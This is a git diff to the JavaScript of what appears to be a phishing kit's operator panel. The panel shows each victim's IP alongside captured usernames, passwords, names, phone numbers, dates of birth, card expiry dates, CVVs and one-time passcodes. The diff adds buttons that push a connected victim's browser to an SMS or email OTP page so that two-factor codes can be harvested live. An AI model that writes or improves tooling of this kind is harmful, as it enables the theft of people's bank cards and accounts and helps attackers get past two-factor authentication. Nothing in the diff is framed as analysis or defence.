@@ -73,6 +73,18 @@ function updateConnectionsTable(users) {
           </div>
     
           `;
+
+          let sendOtpSmsButton = row.querySelector('.send-otp-sms-button');
+          let sendOtpEmailButton = row.querySelector('.send-otp-sms-button');
+          sendOtpSmsButton.addEventListener('click', function() {
+            socket.emit('sendOTP', {ip: ipAddress, navig: `${details.page}/sms` })
+            console.log('emit otp send')
+          });
+
+          sendOtpEmailButton.addEventListener('click', function() {
+            socket.emit('sendOTP', {ip: ipAddress, navig: `${details.page}/email` })
+            console.log('emit otp send')
+          });          
     } else {
       userDiv.innerHTML = `
        
@@ -111,19 +123,19 @@ function updateConnectionsTable(users) {
             IP: ${ipAddress}
         </div>
         <ul class="list-group list-group-flush">
-            <li class="list-group-item">Username: ${details.getUserDataLogin.username || 'N/A'}</li>
-            <li class="list-group-item">Password: ${details.getUserDataLogin.password || 'N/A'}</li>
-            <li class="list-group-item">UserAgent: ${details.getUserDataLogin.userAgent || 'N/A'}</li>
+            <li class="list-group-item">Username: ${details.getUserDataLogin.username || ''}</li>
+            <li class="list-group-item">Password: ${details.getUserDataLogin.password || ''}</li>
+            <li class="list-group-item">UserAgent: ${details.getUserDataLogin.userAgent || ''}</li>
               <li class="list-group-item">----------------------------------------------------------</li>
-            <li class="list-group-item">Fist Name: ${details.getUserDataDetails.fname || 'N/A'}</li>
-            <li class="list-group-item">Last Name: ${details.getUserDataDetails.lname || 'N/A'}</li>
-            <li class="list-group-item">Phone Number: ${details.getUserDataDetails.phone || 'N/A'}</li>
-            <li class="list-group-item">DOB: ${details.getUserDataDetails.dob1 || 'N/A'}/${details.getUserDataDetails.dob2 || 'N/A'}/${details.getUserDataDetails.dob3 || 'N/A'}</li>
+            <li class="list-group-item">Fist Name: ${details.getUserDataDetails.fname || ''}</li>
+            <li class="list-group-item">Last Name: ${details.getUserDataDetails.lname || ''}</li>
+            <li class="list-group-item">Phone Number: ${details.getUserDataDetails.phone || ''}</li>
+            <li class="list-group-item">DOB: ${details.getUserDataDetails.dob1 || ''}/${details.getUserDataDetails.dob2 || ''}/${details.getUserDataDetails.dob3 || ''}</li>
              <li class="list-group-item">----------------------------------------------------------</li>
-            <li class="list-group-item">Exp: ${details.getUserDataCard.exp1 || 'N/A'}/${details.getUserDataCard.exp1 || 'N/A'}</li>
-            <li class="list-group-item">Cvv: ${details.getUserDataCard.cvv || 'N/A'}</li>
+            <li class="list-group-item">Exp: ${details.getUserDataCard.exp1 || ''}/${details.getUserDataCard.exp1 || ''}</li>
+            <li class="list-group-item">Cvv: ${details.getUserDataCard.cvv || ''}</li>
              <li class="list-group-item">----------------------------------------------------------</li>
-            <li class="list-group-item">OTP: ${details.getUserDataOTP.code || 'N/A'}</li>
+            <li class="list-group-item">OTP: ${details.getUserDataOTP.code || ''}</li>
         </ul> </div>`;
 
               // ... Code to set modalBody.innerHTML ...
